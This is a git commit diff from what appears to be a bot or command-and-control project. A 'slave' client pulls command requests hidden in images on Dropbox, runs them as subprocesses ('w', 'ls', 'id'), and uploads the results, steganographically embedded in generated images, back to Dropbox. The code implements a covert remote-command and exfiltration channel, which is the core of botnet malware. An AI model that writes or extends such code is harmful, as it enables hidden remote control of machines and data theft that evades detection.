100649d5d11e0bedd59db413f47b928f643bae1d
Jiří Štengl <stengljirka@gmail.com>
2024-01-03 20:19:34 +0100

    Working ls

--- slave/src/dropbox_handler.py
+++ slave/src/dropbox_handler.py
@@ -1,15 +1,16 @@
 from typing import Tuple, List, Set, FrozenSet
 
-from common.data.commands import CommandExecutionRequest
+from common.data.commands import CommandExecutionRequest, CommandExecutionResult
 from common.data.heartbeat import Heartbeat
 from common.dropbox_wrapper import upload_file, DropboxFolders, list_files_in_folder, download_all_files_from_folder
 from common.image_generators.image_generator import generate_image
-from common.steganography import insert_heartbeat_into_image, read_command_request_from_image
+from common.steganography import insert_heartbeat_into_image, read_command_request_from_image, \
+    insert_command_result_into_image
 from common.utils.string_utils import generate_unique_image_name
 from slave.src.data.properties import get_properties
 
-__IMAGE_HORIZONTAL_DIMENSION = 640
-__IMAGE_VERTICAL_DIMENSION = 480
+__IMAGE_HORIZONTAL_DIMENSION = 1280
+__IMAGE_VERTICAL_DIMENSION = 960
 
 
 def upload_heartbeat(heartbeat: Heartbeat) -> None:
@@ -31,3 +32,10 @@ def download_all_viable_command_requests(resolved_files: FrozenSet[str]) -> List
         command = read_command_request_from_image(downloaded_file.payload)
         filenames_and_commands.append((downloaded_file.name, command))
     return filenames_and_commands
+
+
+def upload_command_result_to_dropbox(command_result: CommandExecutionResult) -> None:
+    generated_image = generate_image(__IMAGE_HORIZONTAL_DIMENSION, __IMAGE_VERTICAL_DIMENSION)
+    generated_name = generate_unique_image_name(get_properties().image_generator_mode)
+    image_with_secret = insert_command_result_into_image(generated_image, command_result)
+    upload_file(DropboxFolders.COMMAND_RESULTS, generated_name, image_with_secret)
--- slave/src/jobs/command_executor_job.py
+++ slave/src/jobs/command_executor_job.py
@@ -1,14 +1,17 @@
+from concurrent.futures import ThreadPoolExecutor
 from threading import Thread
 import subprocess
-from typing import Dict
+from typing import Dict, List
 
 from common.data.commands import CommandExecutionRequest, CommandExecutionResult, CommandTypes, CommandStatus
 from slave.src.data.context import get_new_commands_arrived_condition, \
     get_commands_from_queue, get_bot_id
+from slave.src.dropbox_handler import upload_command_result_to_dropbox
 
 __COMMANDS_EXECUTABLE_BY_SUBPROCESS: Dict[CommandTypes, str] = {CommandTypes.W: "w",
                                                                 CommandTypes.LS: "ls",
                                                                 CommandTypes.ID: "id"}
+__thread_pool_executor: ThreadPoolExecutor = ThreadPoolExecutor(max_workers=1)
 
 
 def __execute_command_as_subprocess(command: str, param: str) -> CommandExecutionResult:
@@ -36,8 +39,15 @@ def __handle_commands() -> None:
         with get_new_commands_arrived_condition():
             get_new_commands_arrived_condition().wait()
         command_queue = get_commands_from_queue()
+        results = []
         for command in command_queue:
-            print(command)
+            results.append(__execute_command(command))
+        __send_results_async(results)
+
+
+def __send_results_async(results: List[CommandExecutionResult]) -> None:
+    for result in results:
+        __thread_pool_executor.submit(upload_command_result_to_dropbox, result)
 
 
 def start_executor_job() -> Thread:
